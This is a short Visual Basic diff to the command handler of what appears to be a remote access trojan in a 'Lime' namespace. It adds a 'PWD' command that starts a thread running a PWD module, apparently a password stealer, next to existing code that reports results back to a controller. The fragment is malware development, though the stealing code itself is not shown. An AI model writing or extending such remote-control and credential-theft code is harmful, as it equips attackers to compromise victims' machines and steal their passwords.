@@ -70,6 +70,9 @@ Namespace Lime
                         Catch ex As Exception
                             C.Send("MSG" & C.SPL & "[VISIT] " & ex.Message)
                         End Try
+                    Case "PWD"
+                        Dim T1 As New Threading.Thread(AddressOf PWD.Begin)
+                        T1.Start()
                 End Select
             Catch ex As Exception
 
